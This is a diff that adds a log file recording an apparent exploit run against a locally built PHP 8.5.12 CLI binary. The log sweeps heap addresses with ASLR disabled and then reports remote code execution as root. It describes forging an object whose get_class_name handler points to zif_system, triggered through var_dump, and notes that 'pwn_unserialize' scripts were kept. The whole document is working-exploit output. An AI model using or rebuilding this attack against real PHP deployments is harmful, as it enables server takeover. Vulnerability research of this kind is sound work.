@@ -1,0 +1,64 @@
+[*] target binary: /tmp/php8512_build/plain2/sapi/cli/php (PHP 8.5.12)
+[+] binary base 0x555555400000  zif_system 0x555555923c60 (+0x523c60)
+[+] ZendMM chunk candidates: 0x7ffff5400000
+[*] chain zero4: running under /usr/bin/setarch -R (ASLR off, no gdb), address sweep
+    [zero4] try #1 chunk=0x7ffff5400000 base=0x7ffff5490000 -> rc=0
+    [zero4] try #2 chunk=0x7ffff5400000 base=0x7ffff5491000 -> rc=0
+    [zero4] try #3 chunk=0x7ffff5400000 base=0x7ffff5492000 -> rc=0
+    [zero4] try #4 chunk=0x7ffff5400000 base=0x7ffff5493000 -> rc=0
+    [zero4] try #5 chunk=0x7ffff5400000 base=0x7ffff5494000 -> rc=0
+    [zero4] try #6 chunk=0x7ffff5400000 base=0x7ffff5495000 -> rc=0
+    [zero4] try #7 chunk=0x7ffff5400000 base=0x7ffff5496000 -> rc=0
+    [zero4] try #8 chunk=0x7ffff5400000 base=0x7ffff5497000 -> rc=0
+    [zero4] try #9 chunk=0x7ffff5400000 base=0x7ffff5498000 -> rc=0
+    [zero4] try #10 chunk=0x7ffff5400000 base=0x7ffff5499000 -> segv
+    [zero4] try #11 chunk=0x7ffff5400000 base=0x7ffff549a000 -> rc=0
+    [zero4] try #12 chunk=0x7ffff5400000 base=0x7ffff549b000 -> segv
+    [zero4] try #13 chunk=0x7ffff5400000 base=0x7ffff549c000 -> rc=0
+    [zero4] try #14 chunk=0x7ffff5400000 base=0x7ffff549d000 -> rc=0
+    [zero4] try #15 chunk=0x7ffff5400000 base=0x7ffff549e000 -> rc=0
+    [zero4] try #16 chunk=0x7ffff5400000 base=0x7ffff549f000 -> segv
+    [zero4] try #17 chunk=0x7ffff5400000 base=0x7ffff54a0000 -> rc=0
+    [zero4] try #18 chunk=0x7ffff5400000 base=0x7ffff54a1000 -> segv
+    [zero4] try #19 chunk=0x7ffff5400000 base=0x7ffff54a2000 -> rc=0
+    [zero4] try #20 chunk=0x7ffff5400000 base=0x7ffff54a3000 -> rc=0
+    [zero4] try #21 chunk=0x7ffff5400000 base=0x7ffff54a4000 -> segv
+    [zero4] try #22 chunk=0x7ffff5400000 base=0x7ffff54a5000 -> rc=0
+    [zero4] try #23 chunk=0x7ffff5400000 base=0x7ffff54a6000 -> segv
+    [zero4] try #24 chunk=0x7ffff5400000 base=0x7ffff54a7000 -> rc=0
+    [zero4] try #25 chunk=0x7ffff5400000 base=0x7ffff54a8000 -> rc=0
+    [zero4] try #26 chunk=0x7ffff5400000 base=0x7ffff54a9000 -> rc=0
+    [zero4] try #27 chunk=0x7ffff5400000 base=0x7ffff54aa000 -> rc=0
+    [zero4] try #28 chunk=0x7ffff5400000 base=0x7ffff54ab000 -> rc=0
+    [zero4] try #29 chunk=0x7ffff5400000 base=0x7ffff54ac000 -> rc=0
+    [zero4] try #30 chunk=0x7ffff5400000 base=0x7ffff54ad000 -> rc=0
+    [zero4] try #31 chunk=0x7ffff5400000 base=0x7ffff54ae000 -> rc=0
+    [zero4] try #32 chunk=0x7ffff5400000 base=0x7ffff54af000 -> rc=0
+    [zero4] try #33 chunk=0x7ffff5400000 base=0x7ffff54b0000 -> segv
+    [zero4] try #34 chunk=0x7ffff5400000 base=0x7ffff54b1000 -> rc=0
+    [zero4] try #35 chunk=0x7ffff5400000 base=0x7ffff54b2000 -> segv
+    [zero4] try #36 chunk=0x7ffff5400000 base=0x7ffff54b3000 -> segv
+    [zero4] try #37 chunk=0x7ffff5400000 base=0x7ffff54b4000 -> segv
+    [zero4] try #38 chunk=0x7ffff5400000 base=0x7ffff54b5000 -> segv
+    [zero4] try #39 chunk=0x7ffff5400000 base=0x7ffff54b6000 -> rc=0
+    [zero4] try #40 chunk=0x7ffff5400000 base=0x7ffff54b7000 -> segv
+    [zero4] try #41 chunk=0x7ffff5400000 base=0x7ffff54b8000 -> rc=0
+    [zero4] try #42 chunk=0x7ffff5400000 base=0x7ffff54b9000 -> rc=0
+    [zero4] try #43 chunk=0x7ffff5400000 base=0x7ffff54ba000 -> segv
+    [zero4] try #44 chunk=0x7ffff5400000 base=0x7ffff54bb000 -> segv
+    [zero4] try #45 chunk=0x7ffff5400000 base=0x7ffff54bc000 -> segv
+    [zero4] try #46 chunk=0x7ffff5400000 base=0x7ffff54bd000 -> segv
+    [zero4] try #47 chunk=0x7ffff5400000 base=0x7ffff54be000 -> segv
+    [zero4] try #48 chunk=0x7ffff5400000 base=0x7ffff54bf000 -> segv
+    [zero4] try #49 chunk=0x7ffff5400000 base=0x7ffff54c0000 -> segv
+    [zero4] try #50 chunk=0x7ffff5400000 base=0x7ffff54c1000 -> rc=0
+    [zero4] try #51 chunk=0x7ffff5400000 base=0x7ffff54c2000 -> rc=0
+    [zero4] try #52 chunk=0x7ffff5400000 base=0x7ffff54c3000 -> rc=0
+    [zero4] try #53 chunk=0x7ffff5400000 base=0x7ffff54c4000 -> rc=0
+    [zero4] try #54 chunk=0x7ffff5400000 base=0x7ffff54c5000 -> rc=0
+    [zero4] try #55 chunk=0x7ffff5400000 base=0x7ffff54c6000 -> HIT
+[+] === zero4: RCE === freed-block base 0x7ffff54c6000
+[+] RECEIPT (command output): uid=0(root) gid=0(root) groups=0(root)
+    forged: OBJ=0x7ffff54c6038 HT=0x7ffff54c6270 zif_system=0x555555923c60
+    TRIGGERING var_dump($r1) -> handlers->get_class_name(obj)=zif_system(fake_execute_data)
+[+] scripts kept in /tmp/pwn_unserialize_2vw7p36e
